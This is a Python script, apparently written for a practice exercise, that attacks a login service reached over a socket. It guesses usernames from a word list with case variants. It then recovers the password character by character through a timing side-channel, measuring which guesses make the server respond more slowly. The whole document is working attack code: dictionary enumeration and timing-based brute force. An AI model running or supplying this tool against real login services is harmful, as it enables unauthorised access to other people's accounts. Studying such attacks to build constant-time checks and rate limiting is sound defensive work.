import sys
import socket
import itertools
import json
from datetime import datetime


def get_bruce_force():
    c = ''.join([chr(c) for c in range(97, 97 + 26)] + [str(c) for c in range(10)])
    pass_dict = []
    while True:
        pass_dict.append(c)
        for p in itertools.product(*pass_dict):
            yield ''.join(p)


def get_bruce_force_1ch():
    c = ''.join([chr(c) for c in range(97, 97 + 26)] + [str(c) for c in range(10)]
                + [chr(c) for c in range(65, 65 + 26)])
    pass_dict = []
    pass_dict.append(c)
    for p in itertools.product(*pass_dict):
        yield ''.join(p)


def get_pass_variations2(word):
    word_len = len(word)
    word_var = list(zip(word.lower(), word.upper()))
    word_var = [list(set(x)) for x in word_var]
    for v in itertools.product([0, 1], repeat=word_len):
        if any([len(word_var[x[0]]) < x[1] + 1 for x in enumerate(v)]):
            continue
        yield ''.join(c[1][v[c[0]]] for c in enumerate(word_var))


def get_dict_pass(p_file):
    for p in p_file:
        for pv in get_pass_variations2(p.strip()):
            yield pv


class RespTimes:
    def __init__(self, cycle=9, deviation_percent=900, treshold=0.002):
        self.cycle = cycle
        self.resps = []
        self.current_resp = 0
        self.is_charged = False
        self.avg_val = None
        self.deviation_percent = deviation_percent
        self.treshold = treshold

    def add_resp_time(self, resp_time):
        if self.is_charged:
            if resp_time > self.avg_val * (1 + self.deviation_percent / 100) + self.treshold:
                return 1
            self.resps[self.current_resp] = resp_time
            self.current_resp += 1
            if self.current_resp > self.cycle - 1:
                self.current_resp = 0
        else:
            self.resps.append(resp_time)
            if len(self.resps) == self.cycle:
                self.avg_val = sum(self.resps) / len(self.resps)
                self.is_charged = True
        return 0


login = ''
password = ' '
pass_ok = 0


args = sys.argv
conn = socket.socket()
conn.connect((args[1], int(args[2])))

common_logins = open('logins.txt', 'r')
login_to_try_gen = get_dict_pass(common_logins)
while not login:
    login_to_try = next(login_to_try_gen)
    conn.send(f'{{"login": "{login_to_try}", "password": "{password}"}}'.encode())
    serv_resp = json.loads(conn.recv(1024).decode())
    if serv_resp['result'] == 'Wrong password!':
        login = login_to_try

common_logins.close()


resp_times = RespTimes()
password = ''
pass_to_try_gen = get_bruce_force_1ch()
while not pass_ok:
    start_sess_dt = datetime.now()
    if not resp_times.is_charged:  # learning the standard time of answer
        conn.send(f'{{"login": "{login}", "password": "wrong_one_12312121212"}}'.encode())
        serv_resp = json.loads(conn.recv(100).decode())
        end_sess_dt = datetime.now()
        resp_times.add_resp_time((end_sess_dt - start_sess_dt).total_seconds())
    else:
        pass_to_try = next(pass_to_try_gen)
        conn.send(f'{{"login": "{login}", "password": "{password + pass_to_try}"}}'.encode())
        x = conn.recv(100).decode()
        serv_resp = json.loads(x)
        end_sess_dt = datetime.now()
          # print(x, login, password + pass_to_try, end_sess_dt - start_sess_dt)
        if resp_times.add_resp_time((end_sess_dt - start_sess_dt).total_seconds()):
            password += pass_to_try
            pass_to_try_gen = get_bruce_force_1ch()
        elif serv_resp['result'] == 'Connection success!':
            pass_ok = 1
            password += pass_to_try


print(f'{{"login": "{login}", "password": "{password}"}}')
conn.close()
